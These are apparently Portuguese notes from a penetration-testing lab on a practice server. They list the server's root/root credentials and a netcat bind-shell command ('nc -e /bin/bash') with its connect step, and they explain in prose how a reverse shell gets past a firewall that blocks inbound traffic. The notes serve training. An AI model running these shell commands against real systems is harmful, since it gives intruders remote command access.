
## Informacoes

```
Acesso via SSH conectado a VPN

IP: 172.16.1.5
Usuario: root
Senha: root

Local das regras do firewall:
/home/msfadmin/firewall/
```

<h2 align="center">Cenario sem firewall</h2>
Basicamente tomamos o acesso bindando uma shell , uma vez que o servidor nao tem nenhuma protecao.

``nc -vnlp 5050 -e /bin/bash``

Na maquina atacante basta conectarmos a essa porta

``nc -vn <IPADDRESS DO SERVIDOR> 5050

<h2 align="center">Cenario Firewall Basico</h2>

![[Screenshot 2024-03-22 12-11-37.png]]

Para atacarmos um servidor com um firewall configurado como basico devemos ver quais portas estao aberta e fechadas , e atraves das portas fechadas vamos abri-la para fazermos nossa bind shell.



<h2 align="center">Cenario Firewall 3 </h2>
![[Screenshot 2024-03-22 16-10-04.png]]
Neste caso , o Firewall esta configurado para recusar TODO tipo de entrada para o servidor , entao como podemos bypassar o firewall? Simples , com Reverse Shell podemos fazer isso. Assim que ganhamos acesso ao servidor basta na nossa maquina (atacante) abrirmos uma porta de conexao como "5050" e atraves do servidor conectarmos com essa nossa maquina atraves desta porta aberta enviando o shell do servidor.



<h2 align="center"> Firewall Fail Cenario 4 </h2>


![[Screenshot 2024-03-22 16-33-13.png]]

![[Screenshot 2024-03-22 16-39-39.png]]